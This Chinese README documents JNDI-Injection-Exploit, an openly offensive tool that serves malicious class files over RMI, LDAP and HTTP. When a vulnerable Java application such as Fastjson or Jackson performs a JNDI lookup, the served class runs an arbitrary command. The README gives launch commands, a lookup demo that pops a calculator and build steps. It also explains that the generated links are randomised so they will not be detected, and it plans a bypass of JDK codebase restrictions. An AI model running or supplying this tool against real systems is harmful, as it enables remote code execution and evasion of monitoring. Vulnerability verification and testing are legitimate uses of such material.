## 介绍

JNDI注入利用工具，生成JNDI链接并启动后端相关服务，可用于Fastjson、Jackson等相关漏洞的验证。

## 使用

可执行程序为jar包，在命令行中运行以下命令：

```shell
$ java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar [-C] [command] [-A] [address]
```

其中:

- **-C** - 远程class文件中要执行的命令。

  （可选项 , 默认命令是mac下打开计算器，即"open /Applications/Calculator.app"）

- **-A** - 服务器地址，可以是IP地址或者域名。

  （可选项 , 默认地址是第一个网卡地址）

注意:

- 要确保 **1099**、**1389**、**8180**端口可用，不被其他程序占用。

  或者你也可以在run.ServerStart类26~28行更改默认端口。

- 命令会被作为参数传入**Runtime.getRuntime().exec()**，

  所以需要确保命令传入exec()方法可执行。
  
  **bash等可在shell直接执行的相关命令需要加双引号，比如说 java -jar JNDI.jar -C "bash -c ..."**

## 示例

### 本地演示：

1. 启动 JNDI-Injection-Exploit：

   ```shell
   $ java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "open /Applications/Calculator.app" -A "127.0.0.1"
   ```

    截图：
    ![](https://github.com/welk1n/JNDI-Injection-Exploit/blob/master/screenshots/1.png)


2. 我们需要把第一步中生成的 JNDI链接注入到存在漏洞的应用环境中，方便解释用如下代码模仿漏洞环境：

   ```java
   public static void main(String[] args) throws Exception{
       InitialContext ctx = new InitialContext();
       ctx.lookup("rmi://127.0.0.1/fgf4fp");
   }
   ```

   当上面代码运行后，应用便会执行相应命令，这里是弹出计算器，没截图，可以自己测一下。

   截图是工具的server端日志：

    ![](https://github.com/welk1n/JNDI-Injection-Exploit/blob/master/screenshots/2.png)



## 安装

下面两种方法都可以得到Jar包

1. 从 [Realease](https://github.com/welk1n/JNDI-Injection-Exploit/releases)直接下载最新的Jar。

2. 把源码下载到本地然后自行编译打包。（在Java1.7+ 、Java1.8+ 和 Maven 3.x+环境下测试可以）

   ```shell
   $ git clone https://github.com/welk1n/JNDI-Injection-Exploit.git
   ```

   ```shell
   $ cd JNDI-Injection-Exploit
   ```

   ```shell
   $ mvn clean package -DskipTests
   ```

## 工具实现

1. 首先生成的链接后面codebaseClass是6位随机的，这个是因为不希望让工具生成的链接本身成为一种特征被监控或拦截。
2. 服务器地址实际就是codebase地址，相比于marshalsec中的JNDI server来说，这个工具把JNDI server和HTTP server绑定到一起，并自动启动HTTP server返回相应class，更自动化了。
3. HTTP server基于jetty实现的，本质上是一个能下载文件的servlet，比较有意思的是我提前编译好class模板放到resource目录，然后servlet会读取class文件，使用ASM框架对读取的字节码进行修改，然后插入我们想要执行的命令，返回修改后的字节码。

## 待实现

- （已完成EL表达式绕过部分）在更高版本的JDK环境中trustURLCodebase变量为false，限制了远程类的加载，我会找时间把[JNDI-Injection-Bypass](https://github.com/welk1n/JNDI-Injection-Bypass)这个项目的东西融入到本项目中，生成能绕过JDK限制JNDI链接。
- … ...
